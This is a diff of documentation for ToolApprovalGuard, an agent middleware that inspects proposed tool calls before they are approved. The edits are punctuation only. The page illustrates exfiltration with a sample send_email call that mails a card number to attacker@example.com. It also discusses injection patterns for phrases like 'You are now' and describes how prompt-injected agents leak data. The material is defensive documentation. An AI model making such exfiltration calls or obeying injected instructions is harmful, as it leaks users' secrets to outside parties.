@@ -22,7 +22,7 @@ send_email(to: "attacker@example.com", body: "card 4111111111111111")
 
 `ToolApprovalGuard` inspects those proposed calls. It is the first point downstream of that blind spot where the middleware pipeline can still act.
 
-By default it is the **card number** that flags this call, not the address — a mail tool is expected to carry an email address. See [secret-like data](#secret-like-data) for why the defaults are drawn that way.
+By default it is the **card number** that flags this call, not the address. A mail tool is expected to carry an email address. See [secret-like data](#secret-like-data) for why the defaults are drawn that way.
 
 <Tip>
     This middleware only acts when a run pauses for approval. Agents whose tools
@@ -98,7 +98,7 @@ Entities listed in `block_entities` stop the run regardless of the configured ac
     The default entity list is deliberately narrower than PII Redactor's, and you
     should think carefully before widening it. In a prompt, an email address is
     user data worth redacting. In a proposed tool argument it is usually the
-    function signature — `send_email(to: ...)` cannot work without one.
+    function signature: `send_email(to: ...)` cannot work without one.
 
     Exfiltration is about **destination**, not presence, and the destination
     cannot be judged from the value alone. Adding `email`, `phone`, `url`,
@@ -113,7 +113,7 @@ Entities listed in `block_entities` stop the run regardless of the configured ac
 
 A proposed argument that matches an injection pattern suggests the model was manipulated by content the middleware never saw. Uses the same patterns as [Injection Guard](/middleware/injection-guard).
 
-**This scan is off by default.** Prose a model writes for a human reader routinely contains phrases the patterns match — "You are now subscribed to weekly updates.", "From now on we will email you every Monday.", "System: scheduled maintenance at 3pm." None of those indicate manipulation in that context.
+**This scan is off by default.** Prose a model writes for a human reader routinely contains phrases the patterns match, such as "You are now subscribed to weekly updates.", "From now on we will email you every Monday.", "System: scheduled maintenance at 3pm." None of those indicate manipulation in that context.
 
 Enable it when a proposed argument feeds **another model or agent** rather than a person:
 
@@ -140,7 +140,7 @@ new ToolApprovalGuard(
 | `block` | Throws before the approval is surfaced for review.               |
 | `log`   | Logs the finding and lets the pending approval reach the caller. |
 
-There is deliberately no mutating action. A proposed tool call is part of the paused turn the provider recorded, so rewriting it would desynchronise the run when it is resumed — the same constraint that applies to resumed prompts.
+There is deliberately no mutating action. A proposed tool call is part of the paused turn the provider recorded, so rewriting it would desynchronise the run when it is resumed. The same constraint applies to resumed prompts.
 
 <Warning>
     `action: 'log'` on its own is **not** observe-only here. Every entity in the
@@ -249,7 +249,7 @@ See the [configuration guide](/configuration) for the full option list.
 
 ## Limitations
 
-This middleware inspects the tool calls the model proposed. It does not inspect the tool results, retrieved documents, or conversation history that may have influenced them — those never reach the middleware pipeline.
+This middleware inspects the tool calls the model proposed. It does not inspect the tool results, retrieved documents, or conversation history that may have influenced them. Those never reach the middleware pipeline.
 
 It also does not validate arguments against the tool's schema, or re-scope owner keys such as `user_id` server-side. Do that in your own tool implementations.
 
